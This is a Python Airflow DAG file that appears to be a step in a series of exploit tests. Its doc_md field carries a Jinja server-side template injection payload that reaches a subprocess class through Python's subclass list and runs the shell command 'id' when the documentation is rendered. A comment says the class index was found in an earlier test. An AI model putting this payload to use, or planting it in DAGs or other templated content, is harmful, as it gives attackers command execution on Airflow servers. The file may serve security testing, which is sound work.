from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator

def say_hello():
    print("Hello World from Airflow!")

default_args = {
    'owner': 'airflow',
    'retries': 1,
    'retry_delay': timedelta(minutes=1),
}

## This one will fail because it assumes the index is 309!!! Check the index from the output of test2.py!!!
with DAG(
    dag_id='test_3',
    default_args=default_args,
    description='Un DAG cualquiera',
    schedule_interval='@daily',
    start_date=datetime(2025, 5, 7),
    catchup=False,
    tags=['ejemplo'],
    doc_md="""
    # Test 3 - ASSUMMING THE INDEX IS 309!!!
    ### Class Name
    {{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}
    ### Command Output
    {{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}
    """
) as dag:
    tarea_1 = PythonOperator(
        task_id='di_hola',
        python_callable=say_hello,
    )